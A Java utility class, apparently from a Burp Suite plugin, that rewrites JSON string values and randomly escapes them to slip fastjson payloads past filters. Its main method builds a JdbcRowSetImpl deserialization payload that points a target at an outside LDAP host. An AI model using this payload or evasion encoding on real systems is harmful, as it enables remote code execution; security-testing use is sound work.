package burp.utils;

import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/** JSON 处理工具：对 JSON 结构做字符串值替换/追加（mode 0/1）、随机 JSON 编码
 *  （fastjson payload 构建用）等纯函数操作。 */
public class JsonUtils {
    /** 按模式更新 JSON 结构中的字符串值：0=替换匹配值，1=追加。 */
    public static List<Object> updateJsonObjectFromStr(Object baseObj, String updateStr, int mode) {
        List<Object> resultList = new ArrayList<>();

        if (mode == 0) {
            resultList.add(replaceUpdate(baseObj, updateStr));
        } else if (mode == 1) {
            resultList.add(appendUpdate(baseObj, updateStr));
        } else {
            throw new IllegalArgumentException("Invalid mode: " + mode);
        }

        return resultList;
    }

    /** 将 JSON 中字符串值替换为 updateStr（递归处理 Map/List）。 */
    private static Object replaceUpdate(Object obj, String updateStr) {
        if (obj == null) {
            return null;
        }
        if (obj instanceof Map) {
            Map<String, Object> map = (Map<String, Object>) obj;
            Map<String, Object> updatedMap = new LinkedHashMap<>();
            for (Map.Entry<String, Object> entry : map.entrySet()) {
                updatedMap.put(entry.getKey(), replaceUpdate(entry.getValue(), updateStr));
            }
            return updatedMap;
        } else if (obj instanceof List) {
            List<Object> list = (List<Object>) obj;
            List<Object> updatedList = new ArrayList<>();
            for (Object item : list) {
                updatedList.add(replaceUpdate(item, updateStr));
            }
            return updatedList;
        } else if (obj instanceof String) {
            return updateStr;
        } else if (obj instanceof Integer) {
            return obj;
        } else if (obj instanceof Double) {
            return obj;
        } else if (obj instanceof Long) {
            return obj;
        }else if (obj instanceof Boolean) {
            return obj;
        } else {
            throw new IllegalArgumentException("Unsupported data type: " + obj.getClass().getName());
        }
    }

    /** 在 JSON 中为每个字符串值追加 updateStr（递归处理 Map/List）。 */
    private static Object appendUpdate(Object obj, String updateStr) {
        if (obj == null) {
            return null;
        }
        if (obj instanceof Map) {
            Map<String, Object> map = (Map<String, Object>) obj;
            Map<String, Object> updatedMap = new LinkedHashMap<>();
            for (Map.Entry<String, Object> entry : map.entrySet()) {
                updatedMap.put(entry.getKey(), appendUpdate(entry.getValue(), updateStr));
            }
            return updatedMap;
        } else if (obj instanceof List) {
            List<Object> list = (List<Object>) obj;
            List<Object> updatedList = new ArrayList<>();
            for (Object item : list) {
                updatedList.add(appendUpdate(item, updateStr));
            }
            return updatedList;
        } else if (obj instanceof String) {
            return obj.toString() + updateStr;
        } else if (obj instanceof Integer) {
            return obj;
        } else if (obj instanceof Double) {
            return obj;
        } else if (obj instanceof Long) {
            return obj;
        }else if (obj instanceof Boolean) {
            return obj;
        }else {
            throw new IllegalArgumentException("Unsupported data type: " + obj.getClass().getName());
        }
    }

    /** 将 JSON 中双引号内的内容转为 backslash-u-XXXX Unicode 编码。 */
    private static String encodeToJsonUnicode(String json) {
        // 匹配双引号中间的部分的正则表达式
        String regex = "\"(.*?)\"";

        // 编译正则表达式
        Pattern pattern = Pattern.compile(regex);

        // 创建Matcher对象
        Matcher matcher = pattern.matcher(json);

        // 使用StringBuffer保存转换后的JSON
        StringBuffer result = new StringBuffer();

        // 循环匹配并替换
        while (matcher.find()) {
            // 获取匹配到的部分（包含引号）
            String matchWithQuotes = matcher.group();

            // 获取匹配到的部分（不包含引号）
            String matchWithoutQuotes = matcher.group(1);

            // 判断是否有引号，然后进行相应的处理
            if (matchWithQuotes != null) {
                // 处理带引号的部分
                String unicodeMatch = "\"" + convertToUnicode(matchWithoutQuotes).replace("\\u", "\\\\u") + "\"";
                matcher.appendReplacement(result, unicodeMatch);
            }
        }

        // 将最后一次匹配后的部分追加到结果中
        matcher.appendTail(result);

        return result.toString();
    }

    /** 将 JSON 中双引号内的内容转为 backslash-x-XX 十六进制编码。 */
    private static String encodeToJsonHex(String json) {
        // 匹配双引号中间的部分的正则表达式
        String regex = "\"(.*?)\"";

        // 编译正则表达式
        Pattern pattern = Pattern.compile(regex);

        // 创建Matcher对象
        Matcher matcher = pattern.matcher(json);

        // 使用StringBuffer保存转换后的JSON
        StringBuffer result = new StringBuffer();

        // 循环匹配并替换
        while (matcher.find()) {
            // 获取匹配到的部分（包含引号）
            String matchWithQuotes = matcher.group();

            // 获取匹配到的部分（不包含引号）
            String matchWithoutQuotes = matcher.group(1);

            // 判断是否有引号，然后进行相应的处理
            if (matchWithQuotes != null) {
                // 处理带引号的部分
                String hexMatch = "\"" + convertToHex(matchWithoutQuotes).replace("\\x", "\\\\x") + "\"";
                matcher.appendReplacement(result, hexMatch);
            }
        }

        // 将最后一次匹配后的部分追加到结果中
        matcher.appendTail(result);

        return result.toString();
    }

    /** 将 JSON 中双引号内的内容随机编码为 Unicode/Hex/明文（fastjson payload 绕过用）。 */
    public static String encodeToJsonRandom(String json) {
        // 匹配双引号中间的部分的正则表达式
        String regex = "\"(.*?)\"";

        // 编译正则表达式
        Pattern pattern = Pattern.compile(regex);

        // 创建Matcher对象
        Matcher matcher = pattern.matcher(json);

        // 使用StringBuffer保存转换后的JSON
        StringBuffer result = new StringBuffer();

        // 循环匹配并替换
        while (matcher.find()) {
            // 获取匹配到的部分（包含引号）
            String matchWithQuotes = matcher.group();

            // 获取匹配到的部分（不包含引号）
            String matchWithoutQuotes = matcher.group(1);

            // 判断是否有引号，然后进行相应的处理
            if (matchWithQuotes != null) {
                // 处理带引号的部分
                String hexMatch = "\"";// + convertToHex(matchWithoutQuotes).replace("\\x", "\\\\x") + "\""
                StringBuilder buildCode = new StringBuilder();
                for (char character : matchWithoutQuotes.toCharArray()) {
                    Random random = new Random();

                    // 生成0到2之间的随机整数
                    int randomNumber = random.nextInt(3);

                    // 根据随机数的值选择执行哪条语句
                    switch (randomNumber) {
                        case 0:
                            buildCode.append("\\u").append(Integer.toHexString(character | 0x10000).substring(1));
                            break;
                        case 1:
                            buildCode.append("\\x").append(Integer.toHexString(character));
                            break;
                        case 2:
                            buildCode.append(character);
                            break;
                        default:
                            System.out.println("未知情况");

                    }

                }
                hexMatch += buildCode.toString().replace("\\x", "\\\\x").replace("\\u", "\\\\u");
                hexMatch += "\"";
                matcher.appendReplacement(result, hexMatch);
            }
        }
        // 将最后一次匹配后的部分追加到结果中
        matcher.appendTail(result);
        return result.toString();
    }

    /** 将字符串逐字符转换为 backslash-u-XXXX Unicode 转义序列。 */
    private static String convertToUnicode(String input) {
        StringBuilder unicode = new StringBuilder();
        for (char character : input.toCharArray()) {
            unicode.append("\\u").append(Integer.toHexString(character | 0x10000).substring(1));
        }
        return unicode.toString();
    }

    /** 将字符串逐字符转换为 backslash-x-XX 十六进制转义序列。 */
    private static String convertToHex(String input) {
        StringBuilder hex = new StringBuilder();
        for (char character : input.toCharArray()) {
            hex.append("\\x").append(Integer.toHexString(character));
        }
        return hex.toString();
    }

    public static void main(String[] args) {
        String s = encodeToJsonRandom("{\n" +
                "  \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "  \"dataSourceName\": \"ldap://192.168.2.2:8085/hcfzoUvw\",\n" +
                "  \"autoCommit\": true\n" +
                "}");
        System.out.println(s);
    }

}
